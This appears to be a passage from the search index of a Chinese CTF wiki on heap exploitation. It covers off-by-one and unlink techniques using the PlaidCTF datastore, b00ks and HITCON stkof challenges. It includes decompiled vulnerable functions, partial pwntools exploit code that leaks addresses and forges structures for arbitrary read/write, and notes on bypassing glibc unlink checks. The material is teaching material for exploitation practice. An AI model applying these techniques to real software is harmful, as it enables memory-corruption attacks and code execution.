            "text": "\u279c  2015_plaidctf_datastore git: ( master )  file datastore \ndatastore: ELF  64 -bit LSB shared object, x86-64, version  1   ( SYSV ) , dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2,  for  GNU/Linux  2 .6.24, BuildID [ sha1 ]= 1a031710225e93b0b5985477c73653846c352add, stripped\n\u279c  2015_plaidctf_datastore git: ( master )  checksec datastore  [ * ]   /mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/off_by_one/2015_plaidctf_datastore/datastore \n    Arch:     amd64-64-little\n    RELRO:    Full RELRO\n    Stack:    Canary found\n    NX:       NX enabled\n    PIE:      PIE enabled\n    FORTIFY:  Enabled\n\u279c  2015_plaidctf_datastore git: ( master )    \u53ef\u4ee5\u770b\u51fa\uff0c\u8be5\u7a0b\u5e8f\u662f64\u4f4d\u52a8\u6001\u94fe\u63a5\u7684\u3002\u4fdd\u62a4\u5168\u90e8\u5f00\u542f\u3002\u3002\u3002", 
            "title": "\u57fa\u672c\u4fe1\u606f"
        }, 
        {
            "location": "/pwn/heap/off_by_one/#_7", 
            "text": "\u5f85\u5b8c\u6210\u3002", 
            "title": "\u529f\u80fd\u5206\u6790"
        }, 
        {
            "location": "/pwn/heap/off_by_one/#_8", 
            "text": "", 
            "title": "\u9898\u76ee"
        }, 
        {
            "location": "/pwn/heap/off_by_one/#b00ks", 
            "text": "", 
            "title": "b00ks"
        }, 
        {
            "location": "/pwn/heap/off_by_one/#_9", 
            "text": "Asis CTF 2016\u7684\u4e00\u9053\u9898\u76ee\uff0c\u8003\u5bdf\u70b9\u662fnull byte off-by-one", 
            "title": "\u4ecb\u7ecd"
        }, 
        {
            "location": "/pwn/heap/off_by_one/#_10", 
            "text": "\u9898\u76ee\u662f\u4e00\u4e2a\u5e38\u89c1\u7684\u9009\u5355\u5f0f\u7a0b\u5e8f\uff0c\u529f\u80fd\u662f\u4e00\u4e2a\u56fe\u4e66\u7ba1\u7406\u7cfb\u7edf\u3002  1. Create a book\n2. Delete a book\n3. Edit a book\n4. Print book detail\n5. Change current author name\n6. Exit  \u7a0b\u5e8f\u63d0\u4f9b\u4e86\u521b\u5efa\u3001\u5220\u9664\u3001\u7f16\u8f91\u3001\u6253\u5370\u56fe\u4e66\u7684\u529f\u80fd\u3002\u9898\u76ee\u662f64\u4f4d\u7a0b\u5e8f\uff0c\u4fdd\u62a4\u5982\u4e0b\u6240\u793a\u3002  Canary                        : No\nNX                            : Yes\nPIE                           : Yes\nFortify                       : No\nRelRO                         : Full  \u7a0b\u5e8f\u6bcf\u521b\u5efa\u4e00\u4e2abook\u4f1a\u5206\u914d0x20\u5b57\u8282\u7684\u7ed3\u6784\u6765\u7ef4\u62a4\u5b83\u7684\u4fe1\u606f  struct book\n{\n    int id;\n    char *name;\n    char *description;\n    int size;\n}", 
            "title": "\u9898\u76ee\u4ecb\u7ecd"
        }, 
        {
            "location": "/pwn/heap/off_by_one/#create", 
            "text": "book\u7ed3\u6784\u4e2d\u5b58\u5728name\u548cdescription\uff0cname\u548cdescription\u5728\u5806\u4e0a\u5206\u914d\u3002\u9996\u5148\u5206\u914dname buffer\uff0c\u4f7f\u7528malloc\uff0c\u5927\u5c0f\u81ea\u5b9a\u4f46\u5c0f\u4e8e32\u3002  printf( \\nEnter book name size:  , *(_QWORD *) size);\n__isoc99_scanf( %d ,  size);\nprintf( Enter book name (Max 32 chars):  ,  size);\nptr = malloc(size);  \u4e4b\u540e\u5206\u914ddescription\uff0c\u540c\u6837\u5927\u5c0f\u81ea\u5b9a\u4f46\u65e0\u9650\u5236\u3002  printf( \\nEnter book description size:  , *(_QWORD *) size);\n        __isoc99_scanf( %d ,  size);\n\nv5 = malloc(size);  \u4e4b\u540e\u5206\u914dbook\u7ed3\u6784\u7684\u5185\u5b58  book = malloc(0x20uLL);\nif ( book )\n{\n    *((_DWORD *)book + 6) = size;\n    *((_QWORD *)off_202010 + v2) = book;\n    *((_QWORD *)book + 2) = description;\n    *((_QWORD *)book + 1) = name;\n    *(_DWORD *)book = ++unk_202024;\n    return 0LL;\n}", 
            "title": "create"
        }, 
        {
            "location": "/pwn/heap/off_by_one/#_11", 
            "text": "\u7a0b\u5e8f\u7f16\u5199\u7684read\u51fd\u6570\u5b58\u5728null byte off-by-one\u6f0f\u6d1e\uff0c\u4ed4\u7ec6\u89c2\u5bdf\u8fd9\u4e2aread\u51fd\u6570\u53ef\u4ee5\u53d1\u73b0\u5bf9\u4e8e\u8fb9\u754c\u7684\u8003\u8651\u662f\u4e0d\u5f53\u7684\u3002  signed __int64 __fastcall my_read(_BYTE *ptr, int number)\n{\n  int i; // [rsp+14h] [rbp-Ch]\n  _BYTE *buf; // [rsp+18h] [rbp-8h]\n\n  if ( number  = 0 )\n    return 0LL;\n  buf = ptr;\n  for ( i = 0; ; ++i )\n  {\n    if ( (unsigned int)read(0, buf, 1uLL) != 1 )\n      return 1LL;\n    if ( *buf ==  \\n  )\n      break;\n    ++buf;\n    if ( i == number )\n      break;\n  }\n  *buf = 0;\n  return 0LL;\n}", 
            "title": "\u6f0f\u6d1e"
        }, 
        {
            "location": "/pwn/heap/off_by_one/#_12", 
            "text": "", 
            "title": "\u5229\u7528"
        }, 
        {
            "location": "/pwn/heap/off_by_one/#1_1", 
            "text": "\u56e0\u4e3a\u7a0b\u5e8f\u4e2d\u7684my_read\u51fd\u6570\u5b58\u5728null byte off-by-one\uff0c\u4e8b\u5b9e\u4e0amy_read\u8bfb\u5165\u7684\u7ed3\u675f\u7b26'\\x00'\u662f\u5199\u5165\u52300x555555756060\u7684\u4f4d\u7f6e\u7684\u3002\u8fd9\u6837\u5f530x555555756060\uff5e0x555555756068\u5199\u5165book\u6307\u9488\u65f6\u5c31\u4f1a\u8986\u76d6\u6389\u7ed3\u675f\u7b26'\\x00'\uff0c\u6240\u4ee5\u8fd9\u91cc\u662f\u5b58\u5728\u4e00\u4e2a\u5730\u5740\u6cc4\u6f0f\u7684\u6f0f\u6d1e\u3002\u901a\u8fc7\u6253\u5370author name\u5c31\u53ef\u4ee5\u83b7\u5f97pointer array\u4e2d\u7b2c\u4e00\u9879\u7684\u503c\u3002  0x555555756040: 0x6161616161616161  0x6161616161616161\n0x555555756050: 0x6161616161616161  0x6161616161616161    == author name\n0x555555756060: 0x0000555555757480  == pointer array    0x0000000000000000\n0x555555756070: 0x0000000000000000  0x0000000000000000\n0x555555756080: 0x0000000000000000  0x0000000000000000  \u4e3a\u4e86\u5b9e\u73b0\u6cc4\u6f0f\uff0c\u9996\u5148\u5728author name\u4e2d\u9700\u8981\u8f93\u516532\u4e2a\u5b57\u8282\u6765\u4f7f\u5f97\u7ed3\u675f\u7b26\u88ab\u8986\u76d6\u6389\u3002\u4e4b\u540e\u6211\u4eec\u521b\u5efabook1\uff0c\u8fd9\u4e2abook1\u7684\u6307\u9488\u4f1a\u8986\u76d6  def js(str):\n     return io.recvuntil(str)\n\ndef jsn(num):\n     return io.recvn(num)\n\ndef fs(str):\n     io.sendline(str)\n\ndef fsn(str):\n     io.send(str)\n\njs( Enter author name: ) #input author name\nfs( a *32)\n\njs( )# create book1\nfs( 1 )\njs( Enter book name size: )\nfs( 32 )\njs( Enter book name (Max 32 chars): )\nfs( object1 )\njs( Enter book description size: )\nfs( 32 )\njs( Enter book description: )\nfs( object1 )\n\njs( )# print book1\nfs( 4 )\njs( Author: )\njs( aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa ) #  == leak book1\nbook1_addr=jsn(6)\nbook1_addr=book1_addr.ljust(8, \\x00 )\nbook1_addr=u64(book1_addr)", 
            "title": "1.\u6cc4\u6f0f"
        }, 
        {
            "location": "/pwn/heap/off_by_one/#2off-by-one", 
            "text": "\u7a0b\u5e8f\u4e2d\u540c\u6837\u63d0\u4f9b\u4e86\u4e00\u79cdchange\u529f\u80fd\uff0cchange\u529f\u80fd\u7528\u4e8e\u4fee\u6539author name\uff0c\u6240\u4ee5\u901a\u8fc7change\u53ef\u4ee5\u5199\u5165author name\uff0c\u5229\u7528off-by-one\u8986\u76d6pointer array\u7b2c\u4e00\u4e2a\u9879\u7684\u4f4e\u5b57\u8282\u3002  \u8986\u76d6\u6389book1\u6307\u9488\u7684\u4f4e\u5b57\u8282\u540e\uff0c\u8fd9\u4e2a\u6307\u9488\u4f1a\u6307\u5411book1\u7684description\uff0c\u7531\u4e8e\u7a0b\u5e8f\u63d0\u4f9b\u4e86edit\u529f\u80fd\u53ef\u4ee5\u4efb\u610f\u4fee\u6539description\u4e2d\u7684\u5185\u5bb9\u3002\u6211\u4eec\u53ef\u4ee5\u63d0\u524d\u5728description\u4e2d\u5e03\u7f6e\u6570\u636e\u4f2a\u9020\u6210\u4e00\u4e2abook\u7ed3\u6784\uff0c\u8fd9\u4e2abook\u7ed3\u6784\u7684description\u548cname\u6307\u9488\u53ef\u4ee5\u7531\u76f4\u63a5\u63a7\u5236\u3002  def off_by_one(addr):\n    addr+=58\n    js( )# create fake book in description\n    fs( 3 )\n    fake_book_data=p64(0x1)+p64(addr)+p64(addr)+pack(0xffff) \n    js( Enter new book description: )\n    fs(fake_book_data)      #  == fake book\n\n\n    js( )# change author name\n    fs( 5 )\n    js( Enter author name: )\n    fs( a *32)          #  == off-by-one  \u8fd9\u91cc\u5728description\u4e2d\u4f2a\u9020\u4e86book\uff0c\u4f7f\u7528\u7684\u6570\u636e\u662fp64(0x1)+p64(addr)+p64(addr)+pack(0xffff)\u3002\n\u5176\u4e2daddr+58\u662f\u4e3a\u4e86\u4f7f\u6307\u9488\u6307\u5411book2\u7684\u6307\u9488\u5730\u5740\uff0c\u4f7f\u5f97\u6211\u4eec\u53ef\u4ee5\u4efb\u610f\u4fee\u6539\u8fd9\u4e9b\u6307\u9488\u503c\u3002", 
            "title": "2.off-by-one\u8986\u76d6\u6307\u9488\u4f4e\u5b57\u8282"
        }, 
        {
            "location": "/pwn/heap/off_by_one/#3", 
            "text": "\u901a\u8fc7\u524d\u97622\u90e8\u5206\u6211\u4eec\u5df2\u7ecf\u83b7\u5f97\u4e86\u4efb\u610f\u5730\u5740\u8bfb\u5199\u7684\u80fd\u529b\uff0c\u8bfb\u8005\u8bfb\u5230\u8fd9\u91cc\u53ef\u80fd\u4f1a\u89c9\u5f97\u4e0b\u9762\u7684\u64cd\u4f5c\u662f\u663e\u800c\u6613\u89c1\u7684\uff0c\u6bd4\u5982\u5199got\u8868\u52ab\u6301\u6d41\u7a0b\u6216\u8005\u5199__malloc_hook\u52ab\u6301\u6d41\u7a0b\u7b49\u3002\u4f46\u662f\u8fd9\u4e2a\u9898\u76ee\u7279\u6b8a\u4e4b\u5904\u5728\u4e8e\u5f00\u542fPIE\u5e76\u4e14\u6ca1\u6709\u6cc4\u6f0flibc\u57fa\u5730\u5740\u7684\u65b9\u6cd5\uff0c\u56e0\u6b64\u6211\u4eec\u8fd8\u9700\u8981\u60f3\u4e00\u4e0b\u5176\u4ed6\u7684\u529e\u6cd5\u3002  \u8fd9\u9053\u9898\u7684\u5de7\u5999\u4e4b\u5904\u5728\u4e8e\u5728\u5206\u914d\u7b2c\u4e8c\u4e2abook\u65f6\uff0c\u4f7f\u7528\u4e00\u4e2a\u5f88\u5927\u7684\u5c3a\u5bf8\uff0c\u4f7f\u5f97\u5806\u4ee5mmap\u6a21\u5f0f\u8fdb\u884c\u62d3\u5c55\u3002\u6211\u4eec\u77e5\u9053\u5806\u6709\u4e24\u79cd\u62d3\u5c55\u65b9\u5f0f\u4e00\u79cd\u662fbrk\u4f1a\u76f4\u63a5\u62d3\u5c55\u539f\u6765\u7684\u5806\uff0c\u53e6\u4e00\u79cd\u662fmmap\u4f1a\u5355\u72ec\u6620\u5c04\u4e00\u5757\u5185\u5b58\u3002  \u5728\u8fd9\u91cc\u6211\u4eec\u7533\u8bf7\u4e00\u4e2a\u8d85\u5927\u7684\u5757\uff0c\u6765\u4f7f\u7528mmap\u6269\u5c55\u5185\u5b58\u3002\u56e0\u4e3ammap\u5206\u914d\u7684\u5185\u5b58\u4e0elibc\u4e4b\u524d\u5b58\u5728\u56fa\u5b9a\u7684\u504f\u79fb\u56e0\u6b64\u53ef\u4ee5\u63a8\u7b97\u51falibc\u7684\u57fa\u5730\u5740\u3002 Start              End                Offset             Perm Path\n0x0000000000400000 0x0000000000401000 0x0000000000000000 r-x /home/vb/\u684c\u9762/123/123\n0x0000000000600000 0x0000000000601000 0x0000000000000000 r-- /home/vb/\u684c\u9762/123/123\n0x0000000000601000 0x0000000000602000 0x0000000000001000 rw- /home/vb/\u684c\u9762/123/123\n0x00007f8d638a3000 0x00007f8d63a63000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/libc-2.23.so\n0x00007f8d63a63000 0x00007f8d63c63000 0x00000000001c0000 --- /lib/x86_64-linux-gnu/libc-2.23.so\n0x00007f8d63c63000 0x00007f8d63c67000 0x00000000001c0000 r-- /lib/x86_64-linux-gnu/libc-2.23.so\n0x00007f8d63c67000 0x00007f8d63c69000 0x00000000001c4000 rw- /lib/x86_64-linux-gnu/libc-2.23.so\n0x00007f8d63c69000 0x00007f8d63c6d000 0x0000000000000000 rw- \n0x00007f8d63c6d000 0x00007f8d63c93000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/ld-2.23.so\n0x00007f8d63e54000 0x00007f8d63e79000 0x0000000000000000 rw-  === mmap\n0x00007f8d63e92000 0x00007f8d63e93000 0x0000000000025000 r-- /lib/x86_64-linux-gnu/ld-2.23.so\n0x00007f8d63e93000 0x00007f8d63e94000 0x0000000000026000 rw- /lib/x86_64-linux-gnu/ld-2.23.so\n0x00007f8d63e94000 0x00007f8d63e95000 0x0000000000000000 rw- \n0x00007ffdc4f12000 0x00007ffdc4f33000 0x0000000000000000 rw- [stack]\n0x00007ffdc4f7a000 0x00007ffdc4f7d000 0x0000000000000000 r-- [vvar]\n0x00007ffdc4f7d000 0x00007ffdc4f7f000 0x0000000000000000 r-x [vdso]\n0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]  Start              End                Offset             Perm Path\n0x0000000000400000 0x0000000000401000 0x0000000000000000 r-x /home/vb/\u684c\u9762/123/123\n0x0000000000600000 0x0000000000601000 0x0000000000000000 r-- /home/vb/\u684c\u9762/123/123\n0x0000000000601000 0x0000000000602000 0x0000000000001000 rw- /home/vb/\u684c\u9762/123/123\n0x00007f6572703000 0x00007f65728c3000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/libc-2.23.so\n0x00007f65728c3000 0x00007f6572ac3000 0x00000000001c0000 --- /lib/x86_64-linux-gnu/libc-2.23.so\n0x00007f6572ac3000 0x00007f6572ac7000 0x00000000001c0000 r-- /lib/x86_64-linux-gnu/libc-2.23.so\n0x00007f6572ac7000 0x00007f6572ac9000 0x00000000001c4000 rw- /lib/x86_64-linux-gnu/libc-2.23.so\n0x00007f6572ac9000 0x00007f6572acd000 0x0000000000000000 rw- \n0x00007f6572acd000 0x00007f6572af3000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/ld-2.23.so\n0x00007f6572cb4000 0x00007f6572cd9000 0x0000000000000000 rw-  === mmap\n0x00007f6572cf2000 0x00007f6572cf3000 0x0000000000025000 r-- /lib/x86_64-linux-gnu/ld-2.23.so\n0x00007f6572cf3000 0x00007f6572cf4000 0x0000000000026000 rw- /lib/x86_64-linux-gnu/ld-2.23.so\n0x00007f6572cf4000 0x00007f6572cf5000 0x0000000000000000 rw- \n0x00007fffec566000 0x00007fffec587000 0x0000000000000000 rw- [stack]\n0x00007fffec59c000 0x00007fffec59f000 0x0000000000000000 r-- [vvar]\n0x00007fffec59f000 0x00007fffec5a1000 0x0000000000000000 r-x [vdso]\n0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]", 
            "title": "3.\u901a\u8fc7\u6808\u5b9e\u73b0\u5229\u7528"
        }, 
        {
            "location": "/pwn/heap/unlink/", 
            "text": "Unlink\n\n\n\u539f\u7406\n\n\n\u6211\u4eec\u5728\u5229\u7528 unlink \u6240\u9020\u6210\u7684\u6f0f\u6d1e\u65f6\uff0c\u5176\u5b9e\u5c31\u662f\u5bf9\u8fdb\u884c unlink chunk \u8fdb\u884c\u5185\u5b58\u5e03\u5c40\uff0c\u7136\u540e\u501f\u52a9 unlink \u64cd\u4f5c\u6765\u8fbe\u6210\u4fee\u6539\u6307\u9488\u7684\u6548\u679c\u3002\n\n\n\u6211\u4eec\u5148\u6765\u7b80\u5355\u56de\u987e\u4e00\u4e0b unlink \u7684\u76ee\u7684\u4e0e\u8fc7\u7a0b\uff0c\u5176\u76ee\u7684\u662f\u628a\u4e00\u4e2a\u53cc\u5411\u94fe\u8868\u4e2d\u7684\u7a7a\u95f2\u5757\u62ff\u51fa\u6765\uff0c\u7136\u540e\u548c\u76ee\u524d\u7269\u7406\u76f8\u90bb\u7684 free chunk \u8fdb\u884c\u5408\u5e76\u3002\u5176\u57fa\u672c\u7684\u8fc7\u7a0b\u5982\u4e0b\n\n\n\n\n\u4e0b\u9762\u6211\u4eec\u9996\u5148\u4ecb\u7ecd\u4e00\u4e0b unlink \u6700\u521d\u6ca1\u6709\u9632\u62a4\u65f6\u7684\u5229\u7528\u65b9\u6cd5\uff0c\u7136\u540e\u4ecb\u7ecd\u76ee\u524d\u5229\u7528 unlink \u7684\u65b9\u5f0f\u3002\n\n\n\u53e4\u8001\u7684 unlink\n\n\n\u5728\u6700\u521d unlink \u5b9e\u73b0\u7684\u65f6\u5019\uff0c\u5176\u5b9e\u662f\u6ca1\u6709\u5bf9\u53cc\u5411\u94fe\u8868\u68c0\u67e5\u7684\uff0c\u4e5f\u5c31\u662f\u8bf4\uff0c\u6ca1\u6709\u4ee5\u4e0b\u7684\u4ee3\u7801\u3002\n\n\n// \u7531\u4e8eP\u5df2\u7ecf\u5728\u53cc\u5411\u94fe\u8868\u4e2d\uff0c\u6240\u4ee5\u6709\u4e24\u4e2a\u5730\u65b9\u8bb0\u5f55\u5176\u5927\u5c0f\uff0c\u6240\u4ee5\u68c0\u67e5\u4e00\u4e0b\u5176\u5927\u5c0f\u662f\u5426\u4e00\u81f4\u3002\n\n\nif\n \n(\n__builtin_expect\n \n(\nchunksize\n(\nP\n)\n \n!=\n \nprev_size\n \n(\nnext_chunk\n(\nP\n)),\n \n0\n))\n      \\\n      \nmalloc_printerr\n \n(\ncorrupted size vs. prev_size\n);\n               \\\n\n// fd bk\n\n\nif\n \n(\n__builtin_expect\n \n(\nFD\n-\nbk\n \n!=\n \nP\n \n||\n \nBK\n-\nfd\n \n!=\n \nP\n,\n \n0\n))\n                      \\\n  \nmalloc_printerr\n \n(\ncheck_action\n,\n \ncorrupted double-linked list\n,\n \nP\n,\n \nAV\n);\n  \\\n\n  \n// next_size related\n\n              \nif\n \n(\n__builtin_expect\n \n(\nP\n-\nfd_nextsize\n-\nbk_nextsize\n \n!=\n \nP\n,\n \n0\n)\n              \\\n                \n||\n \n__builtin_expect\n \n(\nP\n-\nbk_nextsize\n-\nfd_nextsize\n \n!=\n \nP\n,\n \n0\n))\n    \\\n              \nmalloc_printerr\n \n(\ncheck_action\n,\n                                      \\\n                               \ncorrupted double-linked list (not small)\n,\n    \\\n                               \nP\n,\n \nAV\n);\n   \n\n\n\n\u8fd9\u91cc\u6211\u4eec\u4ee5 32 \u4f4d\u4e3a\u4f8b\n\uff0c\u5047\u8bbe\u5806\u5185\u5b58\u6700\u521d\u7684\u5e03\u5c40\u662f\u4e0b\u9762\u7684\u6837\u5b50\n\n\n\n\n\u90a3\u4e48\u5982\u679c\u6211\u4eec\u901a\u8fc7\u67d0\u79cd\u65b9\u5f0f\uff08\n\u6bd4\u5982\u6ea2\u51fa\n\uff09\u5c06 Nextchunk \u7684 fd \u548c bk \u6307\u9488\u4fee\u6539\u4e3a\u6307\u5b9a\u7684\u503c\u3002\u5219\u5f53\u6211\u4eecfree(Q)\u65f6\n\n\n\n\nglibc \u5224\u65ad\u8fd9\u4e2a\u5757\u662f small chunk\u3002\n\n\n\u5224\u65ad\u524d\u5411\u5408\u5e76\uff0c\u53d1\u73b0\u524d\u4e00\u4e2a chunk \u5904\u4e8e\u4f7f\u7528\u72b6\u6001\uff0c\u4e0d\u9700\u8981\u524d\u5411\u5408\u5e76\u3002\n\n\n\u5224\u65ad\u540e\u5411\u5408\u5e76\uff0c\u53d1\u73b0\u540e\u4e00\u4e2a chunk \u5904\u4e8e\u7a7a\u95f2\u72b6\u6001\uff0c\u9700\u8981\u5408\u5e76\u3002\n\n\n\u7ee7\u800c\u5bf9 nextchunk \u91c7\u53d6 unlink \u64cd\u4f5c\u3002\n\n\n\n\n\u90a3\u4e48 unlink \u5177\u4f53\u6267\u884c\u7684\u6548\u679c\u662f\u4ec0\u4e48\u6837\u5b50\u5462\uff1f\u6211\u4eec\u53ef\u4ee5\u6765\u5206\u6790\u4e00\u4e0b\n\n\n\n\nFD=P-\nfd = target addr -12\n\n\nBK=P-\nbk = expect value\n\n\nFD-\nbk = BK\uff0c\u5373 *(target addr-12+12)=BK=expect value\n\n\nBK-\nfd = FD\uff0c\u5373*(expect value +8) = FD = target addr-12\n\n\n\n\n\u770b\u8d77\u6765\u6211\u4eec\u4f3c\u4e4e\u53ef\u4ee5\u901a\u8fc7 unlink \u76f4\u63a5\u5b9e\u73b0\u4efb\u610f\u5730\u5740\u8bfb\u5199\u7684\u76ee\u7684\uff0c\u4f46\u662f\u6211\u4eec\u8fd8\u662f\u9700\u8981\u786e\u4fdd expect value +8 \u5730\u5740\u5177\u6709\u53ef\u5199\u7684\u6743\u9650\u3002\n\n\n\u6bd4\u5982\u8bf4\u6211\u4eec\u5c06 target addr \u8bbe\u7f6e\u4e3a\u67d0\u4e2a got \u8868\u9879\uff0c\u90a3\u4e48\u5f53\u7a0b\u5e8f\u8c03\u7528\u5bf9\u5e94\u7684 libc \u51fd\u6570\u65f6\uff0c\u5c31\u4f1a\u76f4\u63a5\u6267\u884c\u6211\u4eec\u8bbe\u7f6e\u7684\u503c\uff08expect value\uff09\u5904\u7684\u4ee3\u7801\u3002\n\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0cexpect value+8 \u5904\u7684\u503c\u88ab\u7834\u574f\u4e86\uff0c\u9700\u8981\u60f3\u529e\u6cd5\u7ed5\u8fc7\u3002\n\n\n\u5f53\u524d\u7684 unlink\n\n\n\u4f46\u662f\uff0c\u73b0\u5b9e\u662f\u6b8b\u9177\u7684\u3002\u3002\n\u6211\u4eec\u521a\u624d\u8003\u8651\u7684\u662f\u6ca1\u6709\u68c0\u67e5\u7684\u60c5\u51b5\uff0c\u4f46\u662f\u4e00\u65e6\u52a0\u4e0a\u68c0\u67e5\uff0c\u5c31\u6ca1\u6709\u8fd9\u4e48\u7b80\u5355\u4e86\u3002\u6211\u4eec\u770b\u4e00\u4e0b\u5bf9 fd \u548c bk \u7684\u68c0\u67e5\n\n\n// fd bk\n\n\nif\n \n(\n__builtin_expect\n \n(\nFD\n-\nbk\n \n!=\n \nP\n \n||\n \nBK\n-\nfd\n \n!=\n \nP\n,\n \n0\n))\n                      \\\n  \nmalloc_printerr\n \n(\ncheck_action\n,\n \ncorrupted double-linked list\n,\n \nP\n,\n \nAV\n);\n  \\\n\n\n\n\n\u6b64\u65f6\n\n\n\n\nFD-\nbk = target addr - 12 + 12=target_addr\n\n\nBK-\nfd = expect value + 8\n\n\n\n\n\u90a3\u4e48\u6211\u4eec\u4e0a\u9762\u6240\u5229\u7528\u7684\u4fee\u6539 GOT \u8868\u9879\u7684\u65b9\u6cd5\u5c31\u53ef\u80fd\u4e0d\u53ef\u7528\u4e86\u3002\u4f46\u662f\uff0c\u5982\u679c\u6211\u4eec\u4f7f\u5f97 expect value+8 \u4ee5\u53ca target_addr \u7b49\u4e8e P\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u6267\u884c\n\n\n\n\n*P= expect value = P - 8\n\n\n*P = target addr -12 = P - 12\n\n\n\n\n\u5373\u6539\u5199\u4e86\u6307\u9488 P \u7684\u5185\u5bb9\uff0c\u5c06\u5176\u6307\u5411\u4e86\u6bd4\u81ea\u5df1\u4f4e 12 \u7684\u5730\u5740\u5904\u3002\n\n\n\u800c\u5982\u679c\u6211\u4eec\u60f3\u8981\u4f7f\u5f97\u4e24\u8005\u90fd\u6307\u5411 P\uff0c\u53ea\u9700\u8981\u5b89\u88c5\u5982\u4e0b\u65b9\u5f0f\u4fee\u6539\u5373\u53ef\n\n\n\n\n\u6211\u4eec\u4f1a\u901a\u8fc7\u4e4b\u540e\u7684\u4f8b\u5b50\u6765\u8bf4\u660e\uff0c\u6211\u4eec\u8fd9\u6837\u7684\u4fee\u6539\u662f\u53ef\u4ee5\u8fbe\u5230\u4e00\u5b9a\u7684\u6548\u679c\u7684\u3002\n\n\n\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u8fd9\u91cc\u6211\u4eec\u5e76\u6ca1\u6709\u8fdd\u80cc\u4e0b\u9762\u7684\u7ea6\u675f\u3002\n\n\n    \n// \u7531\u4e8eP\u5df2\u7ecf\u5728\u53cc\u5411\u94fe\u8868\u4e2d\uff0c\u6240\u4ee5\u6709\u4e24\u4e2a\u5730\u65b9\u8bb0\u5f55\u5176\u5927\u5c0f\uff0c\u6240\u4ee5\u68c0\u67e5\u4e00\u4e0b\u5176\u5927\u5c0f\u662f\u5426\u4e00\u81f4\u3002\n\n    \nif\n \n(\n__builtin_expect\n \n(\nchunksize\n(\nP\n)\n \n!=\n \nprev_size\n \n(\nnext_chunk\n(\nP\n)),\n \n0\n))\n      \\\n      \nmalloc_printerr\n \n(\ncorrupted size vs. prev_size\n);\n               \\\n\n\n\n\n\u6b64\u5916\uff0c\u5176\u5b9e\u5982\u679c\u6211\u4eec\u8bbe\u7f6enext chunk \u7684 fd \u548c bk \u5747\u4e3a nextchunk \u7684\u5730\u5740\u4e5f\u662f\u53ef\u4ee5\u7ed5\u8fc7\u4e0a\u9762\u7684\u68c0\u6d4b\u7684\u3002\u4f46\u662f\u8fd9\u6837\u7684\u8bdd\uff0c\u5e76\u4e0d\u80fd\u8fbe\u5230\u4fee\u6539\u6307\u9488\u5185\u5bb9\u7684\u6548\u679c\u3002\n\n\n2014 HITCON stkof\n\n\n\u57fa\u672c\u4fe1\u606f\n\n\n\u279c  2014_hitcon_stkof git:\n(\nmaster\n)\n file stkof   \nstkof: ELF \n64\n-bit LSB executable, x86-64, version \n1\n \n(\nSYSV\n)\n, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, \nfor\n GNU/Linux \n2\n.6.32, BuildID\n[\nsha1\n]=\n4872b087443d1e52ce720d0a4007b1920f18e7b0, stripped\n\u279c  2014_hitcon_stkof git:\n(\nmaster\n)\n checksec stkof        \n\n[\n*\n]\n \n/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/unlink/2014_hitcon_stkof/stkof\n\n    Arch:     amd64-64-little\n    RELRO:    Partial RELRO\n    Stack:    Canary found\n    NX:       NX enabled\n    PIE:      No PIE \n(\n0x400000\n)\n\n\n\n\n\n\u53ef\u4ee5\u770b\u51fa\uff0c\u7a0b\u5e8f\u662f 64 \u4f4d\u7684\uff0c\u4e3b\u8981\u5f00\u542f\u4e86 Canary \u548c NX \u4fdd\u62a4\u3002\n\n\n\u57fa\u672c\u529f\u80fd\n\n\n\u7a0b\u5e8f\u51e0\u4e4e\u5565\u8f93\u51fa\u4e5f\u6ca1\u6709\uff0c\u53ea\u80fd\u786c\u770b\u4e86\uff0c\u5927\u6982\u662f\u4e00\u4e2a\u5185\u5b58\u5206\u914d\u5668\uff0c\u5dee\u4e0d\u591a\u6709\u56db\u4e2a\u529f\u80fd\n\n\n\n\n1\uff0c\u5206\u914d\u6307\u5b9a\u5927\u5c0f\u7684\u5185\u5b58\uff0c\u5e76\u5728bss\u6bb5\u8bb0\u5f55\u5bf9\u5e94 chunk \u7684\u6307\u9488\uff0c\u5047\u8bbe\u5176\u4e3aglobal\u3002\n\n\n2\uff0c\u6839\u636e\u6307\u5b9a\u7d22\u5f15\uff0c\u4ee5\u53ca\u6307\u5b9a\u5927\u5c0f\u5411\u6307\u5b9a\u5185\u5b58\u5904\uff0c\u8bfb\u5165\u6570\u636e\u3002\n\u53ef\u89c1\uff0c\u8fd9\u91cc\u5b58\u5728\u5806\u6ea2\u51fa\u7684\u60c5\u51b5\uff0c\u56e0\u4e3a\u8fd9\u91cc\u8bfb\u5165\u5b57\u8282\u7684\u5927\u5c0f\u662f\u7531\u6211\u4eec\u6765\u63a7\u5236\u7684\u3002\n\n\n3\uff0c\u6839\u636e\u6307\u5b9a\u7d22\u5f15\uff0c\u91ca\u653e\u5df2\u7ecf\u5206\u914d\u7684\u5185\u5b58\u5757\u3002\n\n\n4\uff0c\u8fd9\u4e2a\u529f\u80fd\u5e76\u6ca1\u6709\u4ec0\u4e48\u4e71\u7528\uff0c\u672c\u6765\u4ee5\u4e3a\u662f\u53ef\u4ee5\u8f93\u51fa\u5185\u5bb9\uff0c\u7ed3\u679c\u4ec0\u4e48\u4e5f\u6ca1\u6709\u8f93\u51fa\u3002\u3002\n\n\n\n\n\u521d\u6b65\u6d4b\u8bd5\n\n\n\u503c\u5f97\u6ce8\u610f\u7684\u662f\uff0c\u7531\u4e8e\u7a0b\u5e8f\u672c\u8eab\u6ca1\u6709\u8fdb\u884c setbuf 